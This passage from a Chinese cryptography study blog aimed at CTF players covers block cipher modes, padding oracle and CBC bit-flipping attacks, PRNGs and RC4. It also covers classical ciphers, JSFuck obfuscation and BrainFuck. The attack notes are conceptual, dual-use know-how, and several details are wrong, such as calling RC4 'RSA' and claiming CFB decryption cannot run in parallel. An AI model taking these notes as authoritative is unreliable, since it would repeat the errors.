title="应用"></a>应用</h5><ul><li>用于随机数的加密保护。</li><li>用于单分组明文的加密。</li></ul><h4 id="CBC模式"><a href="#CBC模式" class="headerlink" title="CBC模式"></a>CBC模式</h4><p>CBC 全称为密码分组链接（Cipher-block chaining） 模式，这里</p><ul><li>IV 不要求保密</li><li>IV 必须是不可预测的，而且要保证完整性。</li></ul><h5 id="加密-1"><a href="#加密-1" class="headerlink" title="加密"></a>加密</h5><p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/figure/cbc_encryption.png" alt="image"></p><h5 id="解密-1"><a href="#解密-1" class="headerlink" title="解密"></a>解密</h5><p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/figure/cbc_decryption.png" alt="image"></p><h5 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h5><ul><li>密文块不仅和当前密文块相关，而且和前一个密文块或 IV 相关，隐藏了明文的统计特性。</li><li>具有有限的两步错误传播特性，即密文块中的一位变化只会影响当前密文块和下一密文块。</li><li>具有自同步特性，即第 k 块起密文正确，则第 k+1 块就能正常解密。<h5 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h5></li><li>加密不能并行，解密可以并行。</li></ul><h5 id="应用-1"><a href="#应用-1" class="headerlink" title="应用"></a>应用</h5><ul><li>常见的数据加密和 TLS 加密。</li><li>完整性认证和身份认证。</li></ul><h5 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h5><ul><li>字节反转攻击<ul><li>IV 向量，影响第一个明文分组</li><li>第 n 个密文分组，影响第 n + 1 个明文分组</li></ul></li><li>Padding Oracle Attack，具体参见下面介绍</li></ul><h4 id="PCBC模式"><a href="#PCBC模式" class="headerlink" title="PCBC模式"></a>PCBC模式</h4><p>PCBC 的全称为明文密码块链接（Plaintext cipher-block chaining）。也称为填充密码块链接（Propagating cipher-block chaining）。</p><h5 id="加密-2"><a href="#加密-2" class="headerlink" title="加密"></a>加密</h5><p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/figure/pcbc_encryption.png" alt="image"></p><h5 id="解密-2"><a href="#解密-2" class="headerlink" title="解密"></a>解密</h5><p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/figure/pcbc_decryption.png" alt="image"></p><h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5><ul><li>解密过程难以并行化</li><li>互换邻接的密文块不会对后面的密文块造成影响</li></ul><h4 id="CFB模式"><a href="#CFB模式" class="headerlink" title="CFB模式"></a>CFB模式</h4><p>CFB 全称为密文反馈模式（Cipher feedback）。</p><h5 id="加密-3"><a href="#加密-3" class="headerlink" title="加密"></a>加密</h5><p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/figure/cfb_encryption.png" alt="image"></p><h5 id="解密-3"><a href="#解密-3" class="headerlink" title="解密"></a>解密</h5><p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/figure/cfb_decryption.png" alt="image"></p><h5 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h5><ul><li>适应于不同数据格式的要求</li><li>有限错误传播</li><li>自同步<h5 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h5></li><li>加密不能并行化，解密不能并行</li></ul><h5 id="应用-2"><a href="#应用-2" class="headerlink" title="应用"></a>应用</h5><p>该模式适应于数据库加密，无线通信加密等对数据格式有特殊要求的加密环境。</p><h4 id="OFB模式"><a href="#OFB模式" class="headerlink" title="OFB模式"></a>OFB模式</h4><p>OFB 全称为输出反馈模式（Output feedback），其反馈内容是分组加密后的内容而不是密文。</p><h5 id="加密-4"><a href="#加密-4" class="headerlink" title="加密"></a>加密</h5><p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/figure/ofb_encryption.png" alt="image"></p><h5 id="解密-4"><a href="#解密-4" class="headerlink" title="解密"></a>解密</h5><p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/figure/ofb_decryption.png" alt="image"></p><h5 id="优点-3"><a href="#优点-3" class="headerlink" title="优点"></a>优点</h5><ul><li>不具有错误传播特性。<h5 id="缺点-3"><a href="#缺点-3" class="headerlink" title="缺点"></a>缺点</h5></li><li>IV 无需保密，但是对每个消息必须选择不同的 IV。</li><li>不具有自同步能力。</li></ul><h5 id="应用-3"><a href="#应用-3" class="headerlink" title="应用"></a>应用</h5><p>适用于一些明文冗余度比较大的场景，如图像加密和语音加密。</p><h4 id="CTR模式"><a href="#CTR模式" class="headerlink" title="CTR模式"></a>CTR模式</h4><p>CTR 全称为计数器模式（Counter mode），该模式由 Diffe 和 Hellman 设计。</p><h5 id="加密-5"><a href="#加密-5" class="headerlink" title="加密"></a>加密</h5><p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/figure/ctr_encryption.png" alt="image"></p><h5 id="解密-5"><a href="#解密-5" class="headerlink" title="解密"></a>解密</h5><p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/figure/ctr_encryption.png" alt="image"></p><h4 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h4><p>Padding Oracle Attack 攻击一般需要满足以下几个条件</p><ul><li>加密算法<ul><li>采用 PKCS5 Padding 的加密算法。 当然，非对称加密中 OAEP 的填充方式也有可能会受到影响。</li><li>分组模式为 CBC 模式。</li></ul></li><li>攻击者能力<ul><li>攻击者可以拦截上述加密算法加密的消息。</li><li>攻击者可以和 padding oracle（即服务器） 进行交互：客户端向服务器端发送密文，服务器端会以某种返回信息告知客户端 padding 是否正常。</li></ul></li></ul><p>Padding Oracle Attack 攻击可以达到的效果如下</p><ul><li>在不清楚 key 和 IV 的前提下解密任意给定的密文。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 现代密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 块密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>现代密码学基础一</title>
      <link href="/2019/01/04/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E4%B8%80/"/>
      <url>/2019/01/04/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h2><p>流密码一般逐字节或者逐比特处理信息。一般来说：</p><ul><li>流密码的密钥长度会与明文的长度相同。</li><li>流密码的密钥派生自一个较短的密钥，派生算法通常为一个伪随机数生成算法。</li></ul><p>需要注意的是，流加密目前来说都是对称加密。</p><p>伪随机数生成算法生成的序列的随机性越强，明文中的统计特征被覆盖的更好。</p><p>流密码加解密非常简单，在已知明文的情况下，可以非常容易地获取密钥流。</p><p>流密码的关键在于设计好的伪随机数生成器。一般来说，伪随机数生成器的基本构造模块为反馈移位寄存器。当然，也有一些特殊设计的流密码，比如 RC4。</p><h3 id="伪随机数生成器"><a href="#伪随机数生成器" class="headerlink" title="伪随机数生成器"></a>伪随机数生成器</h3><p>伪随机数生成器（pseudorandom number generator，PRNG），又称为确定性随机位生成器（deterministic random bit generator，DRBG），是用来生成接近于绝对随机数序列的数字序列的算法。一般来说，PRNG 会依赖于一个初始值，也称为种子，来生成对应的伪随机数序列。只要种子确定了，PRNG 所生成的随机数就是完全确定的，因此其生成的随机数序列并不是真正随机的。</p><p>就目前而言，PRNG 在众多应用都发挥着重要的作用，比如模拟（蒙特卡洛方法），电子竞技，密码应用。</p><h4 id="随机性的严格性"><a href="#随机性的严格性" class="headerlink" title="随机性的严格性"></a>随机性的严格性</h4><ul><li>随机性：随机数应该不存在统计学偏差，是完全杂乱的数列。</li><li>不可预测性：不能从过去的序列推测出下一个出现的数。</li><li>不可重现性：除非数列保存下来，否则不能重现相同的数列。</li></ul><p>这三个性质的严格性依次递增。</p><p>一般来说，随机数可以分为三类</p><table><thead><tr><th>类别</th><th>随机性</th><th>不可预测性</th><th>不可重现性</th></tr></thead><tbody><tr><td>弱伪随机数</td><td>✅</td><td>❌</td><td>❌</td></tr><tr><td>强伪随机数</td><td>✅</td><td>✅</td><td>❌</td></tr><tr><td>真随机数</td><td>✅</td><td>✅</td><td>✅</td></tr></tbody></table><p>一般来说，密码学中使用的随机数是第二种。</p><h4 id="周期"><a href="#周期" class="headerlink" title="周期"></a>周期</h4><p>正如我们之前所说，一旦 PRNG 所依赖的种子确定了，那么 PRNG 生成的随机数序列基本也就确定了。这里定义 PRNG 的周期如下：对于一个 PRNG 的所有可能起始状态，不重复序列的最长长度。显然，对于一个 PRNG 来说，其周期不会大于其所有可能的状态。但是，需要注意的是，并不是当我们遇到重复的输出时，就可以认为是 PRNG 的周期，因为 PRNG 的状态一般都是大于输出的位数的(一般性限制条件)。</p><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>目前通用的伪随机数生成器主要有：</p><ul><li>线性同余生成器，LCG</li><li>线性回归发生器</li><li>线性反馈移位寄存器（Linear feedback shift register，LFSR）</li><li>Mersenne Twister</li><li>xorshift generators</li><li>WELL family of generators</li></ul><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>通常来说，伪随机数生成器可能会有以下问题：  </p><ul><li>在某些种子的情况下，其生成的随机数序列的周期会比较小。</li><li>生成大数时，分配的不均匀。</li><li>连续值之间关联密切，知道后续值，可以知道之前的值。</li><li>输出序列的值的大小很不均匀。</li></ul><h3 id="密码安全伪随机数数生成器"><a href="#密码安全伪随机数数生成器" class="headerlink" title="密码安全伪随机数数生成器"></a>密码安全伪随机数数生成器</h3><p>密码学安全伪随机数生成器（cryptographically secure pseudo-random number generator，CSPRNG），也称为密码学伪随机数生成器（cryptographic pseudo-random number generator，CPRNG)，是一种特殊的伪随机数生成器。它需要满足满足一些必要的特性，以便于适合于密码学应用。</p><p>密码学的很多方面都需要随机数：</p><ul><li>密钥生成</li><li>生成初始化向量，IV，用于分组密码的 CBC，CFB，OFB 模式</li><li>nonce，用于防止重放攻击以及分组密码的 CTR 模式等、</li><li>one-time pads</li><li>某些签名方案中的盐，如 ECDSA， RSASSA-PSS</li></ul><p>注：在资讯安全中，Nonce是一个在加密通信只能使用一次的数字。在认证协议中，它往往是一个随机或伪随机数，以避免重放攻击。Nonce也用于流密码以确保安全。如果需要使用相同的密钥加密一个以上的消息，就需要Nonce来确保不同的消息与该密钥加密的密钥流不同。</p><h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>毫无疑问，密码学安全伪随机数生成器的要求肯定比一般的伪随机数生成器要高。一般而言，CSPRNG 的要求可以分为两类</p><ul><li>通过统计随机性测试。CSPRNG 必须通过 next-bit test，也就是说，知道了一个序列的前 k 个比特，攻击者不可能在多项式时间内以大于 50% 的概率预测出来下一个比特位。这里特别提及一点，姚期智曾在 1982 年证明，如果一个生成器可以通过 next-bit test，那么它也可以通过所有其他的多项式时间统计测试。</li><li>必须能够抵抗足够强的攻击，比如当生成器的部分初始状态或者运行时的状态被攻击者获知时，攻击者仍然不能够获取泄漏状态之前的生成的随机数。</li></ul><h4 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h4><p>就目前而看， CSPRNG 的设计可以分为以下三类</p><ul><li>基于密码学算法，如密文或者哈希值。</li><li>基于数学难题</li><li>某些特殊目的的设计</li></ul><h3 id="反馈移位寄存器"><a href="#反馈移位寄存器" class="headerlink" title="反馈移位寄存器"></a>反馈移位寄存器</h3><p>一般的，一个 n 级反馈移位寄存器如下图所示</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEBc234f54efe1a0af70602bf1974c14605?method=download&amp;shareKey=415fcf56b93e427f2b1df0417a1add43" alt="image"></p><ul><li>$a_0$,$a_1$,…,$a_{n-1}$为初态。</li><li>F为反馈函数或者反馈逻辑。如果 F 为线性函数，那么我们称其为线性反馈移位寄存器（LFSR），否则我们称其为非线性反馈移位寄存器（NFSR）。</li><li>$a_{i+n}$=F($a_i$,$a_{i+1}$,…,$a_{i+n-1}$)</li></ul><p>一般来说，反馈移位寄存器都会定义在某个有限域上，从而避免数字太大和太小的问题。因此，我们可以将其视为同一个空间中的变换，即</p><p>($a_i$,$a_{i+1}$,…,$a_{i+n-1}$) -&gt; ($a_{i+1}$,..,$a_{i+n-1}$,$a_{i+n}$),对于一个序列来说，我们一般定义其生成函数为其序列对应的幂级数的和。</p><h4 id="非线性反馈寄存器"><a href="#非线性反馈寄存器" class="headerlink" title="非线性反馈寄存器"></a>非线性反馈寄存器</h4><p>//TODO</p><h3 id="特殊流密码-RC4"><a href="#特殊流密码-RC4" class="headerlink" title="特殊流密码-RC4"></a>特殊流密码-RC4</h3><p>RSA 由 Ron Rivest 设计，最初隶属于 RSA 安全公司，是一个专利密码产品。它是面向字节的流密码，密钥长度可变，非常简单，但也很有效果。RC4 算法广泛应用于 SSL/TLS 协议和 WEP/WPA 协议。</p><p>RC4 主要包含三个流程：  </p><ul><li>初始化 S 和 T 数组。</li><li>初始化置换 S。</li><li>生成密钥流。</li></ul><h4 id="初始化-S-和-T-数组"><a href="#初始化-S-和-T-数组" class="headerlink" title="初始化 S 和 T 数组"></a>初始化 S 和 T 数组</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i = 0 to 255 do</span><br><span class="line">    S[i] = i</span><br><span class="line">    T[i] = K[i mod keylen])</span><br></pre></td></tr></table></figure><p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/special/figure/rc4_s_t.png" alt="image"></p><h4 id="初始化置换-S"><a href="#初始化置换-S" class="headerlink" title="初始化置换 S"></a>初始化置换 S</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">j = 0</span><br><span class="line">for i = 0 to 255 do </span><br><span class="line">    j = (j + S[i] + T[i]) (mod 256) </span><br><span class="line">    swap (S[i], S[j])</span><br></pre></td></tr></table></figure><p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/special/figure/rc4_s.png" alt="image"></p><h4 id="生成流密钥"><a href="#生成流密钥" class="headerlink" title="生成流密钥"></a>生成流密钥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">i = j = 0 </span><br><span class="line">for each message byte b</span><br><span class="line">    i = (i + 1) (mod 256)</span><br><span class="line">    j = (j + S[i]) (mod 256)</span><br><span class="line">    swap(S[i], S[j])</span><br><span class="line">    t = (S[i] + S[j]) (mod 256) </span><br><span class="line">    print S[t]</span><br></pre></td></tr></table></figure><p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/special/figure/rc4_key.png" alt="image"></p><p>我们一般称前两部分为 KSA ，最后一部分是 PRGA。</p>]]></content>
      
      
      <categories>
          
          <category> 现代密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>古典密码学基础三</title>
      <link href="/2019/01/03/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E4%B8%89/"/>
      <url>/2019/01/03/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<h3 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h3><p>培根密码使用两种不同的字体，代表 A 和 B，结合加密表进行加解密。<br><img src="https://note.youdao.com/yws/api/personal/file/WEB614471942b2a382c57f0cf2346e379a8?method=download&amp;shareKey=3ce1ae584d6f0c4aaa50ad70471ac721" alt="image"><br>上面的是常用的加密表。还有另外的一种加密表，可认为是将 26 个字母从 0 到 25 排序，以二进制表示，A 代表 0，B 代表 1。</p><p>下面这一段内容就是明文 steganography 使用<br>To encode a message each letter of the plaintext is replaced by a group of five of the letters ‘A’ or ‘B’.<br>加密后的内容，大写为A，小写为B。<br>|明文|s|t|e|g|a|n|o|g|r|a|p|h|y|<br>|-|-|-|-|-|-|-|-|-|-|-|-|-|-|<br>|转换表|baaab|baaba|aabaa|aabba|aaaaa|abbaa|abbab|aabba|baaaa|aaaaa|abbba|aabbb|babba|<br>|密文|tOENc|oDEaM|ESsAG|EEacH|LETTE|RofTH|EplAi|NTexT|iSREP|LACED|ByagR|OUpof|fIveL|</p><p>可以看到，培根密码主要有以下特点：</p><ul><li>只有两种字符（大小写，粗/正常题，斜/正常体等）</li><li>每一段的长度为5</li><li>加密内容会有特殊的字体之分，亦或大小写之分</li></ul><p>工具：<a href="http://rumkin.com/tools/cipher/baconian.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/baconian.php</a></p><h3 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h3><p>栅栏密码把要加密的明文分成 N 个一组，然后把每组的第 1 个字连起来，形成一段无规律的话。这里给出一个例子：<br>明文：THERE IS A CIPHER</p><p>去掉空格后变为</p><blockquote><p>THEREISACIPHER</p></blockquote><p>分成两栏，两个一组得到</p><blockquote><p>TH ER EI SA CI PH ER</p></blockquote><p>先取出第一个字母，再取出第二个字母</p><blockquote><p>TEESCPE<br>HRIAIHR</p></blockquote><p>连在一起就是</p><blockquote><p>TEESCPEHRIAIHR</p></blockquote><p>上述明文也可以分为 2 栏。</p><blockquote><p>THEREIS ACIPHER</p></blockquote><p>组合得到密文</p><blockquote><p>TAHCEIRPEHIESR</p></blockquote><p>工具：<a href="http://ctf.ssleye.com/railfence.html" target="_blank" rel="noopener">http://ctf.ssleye.com/railfence.html</a></p><h3 id="曲路密码"><a href="#曲路密码" class="headerlink" title="曲路密码"></a>曲路密码</h3><p>曲路密码（Curve Cipher）是一种换位密码，需要事先双方约定密钥（也就是曲路路径）。下面给出一个例子：  </p><blockquote><p>明文：The quick brown fox<br>jumps over the lazy dog</p></blockquote><p>填入 5 行 7 列表（事先约定填充的行列数）<br><img src="https://note.youdao.com/yws/api/personal/file/WEBaab90fd8528f744a4b6e3ed6c78df86e?method=download&amp;shareKey=cb2988f0247bbc4a64bb037340e21266" alt="image"><br>加密的回路线（事先约定填充的行列数）<br><img src="https://note.youdao.com/yws/api/personal/file/WEB135692c80f25a4ec2cd7bf21aeecbdc9?method=download&amp;shareKey=c983704ab96d9ddaadcfa3d7cf67ab6d" alt="image"><br>密文：gesfc inpho dtmwu qoury zejre hbxva lookT</p><h3 id="01248密码"><a href="#01248密码" class="headerlink" title="01248密码"></a>01248密码</h3><p>该密码又称为云影密码，使用 0，1，2，4，8 四个数字，其中 0 用来表示间隔，其他数字以加法可以表示出 如：28=10，124=7，18=9，再用 1-&gt;26 表示 A-&gt;Z。</p><p>可以看出该密码有以下特点：</p><ul><li>只有 0，1，2，4，8</li></ul><p>例如：8842101220480224404014224202480122</p><p>按照0来分割：<br>|内容|数字|字符|<br>|-|-|-|<br>|88421|8+8+4+2+1=23|W|<br>|122|1+2+2=5|E|<br>|48|4+8=12|L|<br>|2244|2+2+4+4=12|L|<br>|4|4|D|<br>|142242|1+4+2+2+4+2=15|0|<br>|248|2+4+8=14|N|<br>|122|1+2+2=5|E|<br>明文：WELLDONE</p><h3 id="JSFuck"><a href="#JSFuck" class="headerlink" title="JSFuck"></a>JSFuck</h3><p>JSFuck 可以只用 6 个字符 <a href=""></a>!+ 来编写 JavaScript 程序。比如我们想用 JSFuck 来实现 alert(1) 代码如下：  </p><blockquote><p>[][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]][([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+([][[]]+[])[+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[+!+[]]]]+([][[]]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+(!![]+[])[+[<a href="(![]+[]">+!+[]]]]</a>[+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+[+!+[]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]])()</p></blockquote><p>其他一些基本的表达：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">false       =&gt;  ![]</span><br><span class="line">true        =&gt;  !![]</span><br><span class="line">undefined   =&gt;  [][[]]</span><br><span class="line">NaN         =&gt;  +[![]]</span><br><span class="line">0           =&gt;  +[]</span><br><span class="line">1           =&gt;  +!+[]</span><br><span class="line">2           =&gt;  !+[]+!+[]</span><br><span class="line">10          =&gt;  [+!+[]]+[+[]]</span><br><span class="line">Array       =&gt;  []</span><br><span class="line">Number      =&gt;  +[]</span><br><span class="line">String      =&gt;  []+[]</span><br><span class="line">Boolean     =&gt;  ![]</span><br><span class="line">Function    =&gt;  [][&quot;filter&quot;]</span><br><span class="line">eval        =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br><span class="line">window      =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()</span><br></pre></td></tr></table></figure></p><p>工具：<a href="http://www.jsfuck.com" target="_blank" rel="noopener">http://www.jsfuck.com</a></p><h3 id="BrainFuck"><a href="#BrainFuck" class="headerlink" title="BrainFuck"></a>BrainFuck</h3><p>Brainfuck，是一种极小化的计算机语言，它是由 Urban Müller 在 1993 年创建的。我们举一个例子，如果我们想要一个在屏幕上打印 Hello World！，那么对应的程序如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]</span><br><span class="line">&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.</span><br><span class="line">&gt;.+++.------.--------.&gt;+.&gt;.</span><br></pre></td></tr></table></figure></p><p>与其对应的还有 ook。</p><p>工具：<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p><h3 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a>猪圈密码</h3><p>猪圈密码是一种以格子为基础的简单替代式密码，格子如下：<br><img src="https://note.youdao.com/yws/api/personal/file/WEB76a78a8b102de070a7fcdc8824660b2b?method=download&amp;shareKey=71bed2948c5cec3dc77b6ce43c5967c0" alt="image"><br>例如：明文为 X marks the spot ，那么密文如下：<br><img src="https://note.youdao.com/yws/api/personal/file/WEB542ffbb69121a02be44c46268eae3bac?method=download&amp;shareKey=188f938bab6d2ebea01940a2c755e75d" alt="image"></p><p>工具：<a href="http://www.simonsingh.net/The_Black_Chamber/pigpen.html" target="_blank" rel="noopener">http://www.simonsingh.net/The_Black_Chamber/pigpen.html</a></p><h3 id="舞动的小人密码"><a href="#舞动的小人密码" class="headerlink" title="舞动的小人密码"></a>舞动的小人密码</h3><p>这种密码出自于福尔摩斯探案集。每一个跳舞的小人实际上对应的是英文二十六个字母中的一个，而小人手中的旗子则表明该字母是单词的最后一个字母，如果仅仅是一个单词而不是句子，或者是句子中最后的一个单词，则单词中最后一个字母不必举旗。<br><img src="https://note.youdao.com/yws/api/personal/file/WEB0d432b9016f9d7f01d93260b1c0124d3?method=download&amp;shareKey=dad1725328f62432fc4eb1f48d10f5bb" alt="image"></p><h3 id="键盘密码"><a href="#键盘密码" class="headerlink" title="键盘密码"></a>键盘密码</h3><p>所谓键盘密码，就是采用手机键盘或者电脑键盘进行加密。</p><h4 id="手机键盘密码"><a href="#手机键盘密码" class="headerlink" title="手机键盘密码"></a>手机键盘密码</h4><p>手机键盘加密方式，是每个数字键上有 3-4 个字母，用两位数字来表示字母，例如：ru 用手机键盘表示就是：7382，那么这里就可以知道了，手机键盘加密方式不可能用 1 开头，第二位数字不可能超过 4，解密的时候参考此。<br><img src="https://note.youdao.com/yws/api/personal/file/WEB35c2548fd5300110899752984fa99371?method=download&amp;shareKey=4008d4855211fc73f4597b224067d0b6" alt="image"><br>关于手机键盘加密还有另一种方式，就是「音的」式（这一点可能根据手机的不同会有所不同），具体参照手机键盘来打，例如：「数字」表示出来就是：748 94。在手机键盘上面按下这几个数，就会出：「数字」的拼音。</p><h4 id="电脑键盘棋盘密码"><a href="#电脑键盘棋盘密码" class="headerlink" title="电脑键盘棋盘密码"></a>电脑键盘棋盘密码</h4><p>电脑键盘棋盘加密，利用了电脑的棋盘方阵。<br><img src="https://note.youdao.com/yws/api/personal/file/WEB2e33ea38af7f4baf490ff9f39d715c9f?method=download&amp;shareKey=3648b73f7f64573b1a572be93c70e8fb" alt="iamge"></p><h4 id="电脑键盘坐标密码"><a href="#电脑键盘坐标密码" class="headerlink" title="电脑键盘坐标密码"></a>电脑键盘坐标密码</h4><p>电脑键盘坐标加密，利用键盘上面的字母行和数字行来加密，例：bye 用电脑键盘 XY 表示就是：351613</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEBe0e36122c77aa2b4f9082895a8d6082b?method=download&amp;shareKey=714cffcaddd3a713461ba4e51c85d471" alt="image"></p><h4 id="电脑键盘QWE"><a href="#电脑键盘QWE" class="headerlink" title="电脑键盘QWE"></a>电脑键盘QWE</h4><p>电脑键盘 QWE 加密法，就是用字母表替换键盘上面的排列顺序。</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEBd5d37d656e0d67ee4d6abf87233c61d0?method=download&amp;shareKey=5f547f51c40690833c88da1a7f3e0077" alt="image"></p><h3 id="CTF案例"><a href="#CTF案例" class="headerlink" title="CTF案例"></a>CTF案例</h3><ol><li>0CTF 2014 classic<blockquote><p>小丁丁发现自己置身于一个诡异的房间，面前只有一扇刻着奇怪字符的门。 他发现门边上还有一道密码锁，似乎要输入密码才能开门。。4esxcft5 rdcvgt 6tfc78uhg 098ukmnb</p></blockquote></li></ol><p>发现这么乱，还同时包括数字和字母猜想可能是键盘密码，试着在键盘上按照字母顺序描绘一下，可得到 0ops 字样，猜测就是 flag 了。</p><ol start="2"><li>2017 年 xman 选拔赛——一二三，木头人 <blockquote><p>我数 123 木头人，再不行动就要被扣分。</p><p>23731263111628163518122316391715262121</p><p>密码格式 xman{flag}<br>题目中有很明显的提示 123，那么就自然需要联想到键盘密码中电脑键盘坐标密码，可以发现前几个数字第二个数字都是 1-3 